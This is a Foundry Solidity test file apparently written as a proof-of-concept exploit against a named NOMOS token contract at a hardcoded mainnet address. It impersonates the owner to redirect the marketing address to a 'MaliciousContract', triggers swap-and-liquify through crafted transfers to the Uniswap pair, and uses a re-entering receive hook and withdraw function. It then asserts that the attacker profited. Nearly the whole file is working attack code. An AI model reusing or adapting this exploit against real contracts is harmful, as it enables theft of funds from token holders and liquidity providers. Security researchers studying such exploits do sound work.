// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface INOMOS {
    function owner() external view returns (address);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function balanceOf(address account) external view returns (uint256);
    function marketingAccumulator() external view returns (uint256);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);
    INOMOS public nomos;
    MaliciousContract public malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        nomos = INOMOS(TARGET);
        malicious = new MaliciousContract(TARGET, address(this));
        vm.label(TARGET, "NOMOS Token");
        vm.label(address(malicious), "Malicious Contract");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address owner = nomos.owner();
        vm.startPrank(owner);
        nomos.setMarketingAddress(address(malicious));
        nomos.setSwapAndLiquifyEnabled(true);
        vm.stopPrank();

        uint256 minTokens = nomos.minimumTokensBeforeSwapAmount();

        // Deal ETH to this contract for liquidity
        deal(address(this), 100 ether);

        // Add liquidity to pair directly
        IERC20(TARGET).approve(address(nomos.uniswapV2Router()), minTokens);
        nomos.uniswapV2Router().addLiquidityETH{value: 50 ether}(TARGET, minTokens, 0, 0, address(this), block.timestamp + 1 hours);

        // Deal tokens to attacker
        deal(TARGET, address(this), minTokens * 3);

        // Transfer tokens to pair to accumulate fees in contract
        IERC20(TARGET).approve(TARGET, minTokens * 3);
        IERC20(TARGET).transferFrom(address(this), nomos.uniswapV2Pair(), minTokens * 2);

        uint256 attackerBalanceBefore = address(this).balance;

        // Trigger swap by transferring more tokens to pair
        IERC20(TARGET).transferFrom(address(this), nomos.uniswapV2Pair(), minTokens);

        // Withdraw from malicious contract
        malicious.withdraw();

        uint256 attackerBalanceAfter = address(this).balance;
        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Attacker balance after:", attackerBalanceAfter);
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have profited");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract MaliciousContract {
    INOMOS public nomos;
    address public attacker;
    bool public isReentering;

    constructor(address _nomos, address _attacker) {
        nomos = INOMOS(_nomos);
        attacker = _attacker;
    }

    receive() external payable {
        if (!isReentering && address(this).balance > 0) {
            isReentering = true;
            uint256 balance = IERC20(address(nomos)).balanceOf(address(this));
            if (balance > 0) {
                IERC20(address(nomos)).approve(address(nomos.uniswapV2Pair()), balance);
                IERC20(address(nomos)).transfer(address(nomos.uniswapV2Pair()), balance);
            }
            isReentering = false;
        }
    }

    function withdraw() external {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);
    }
}

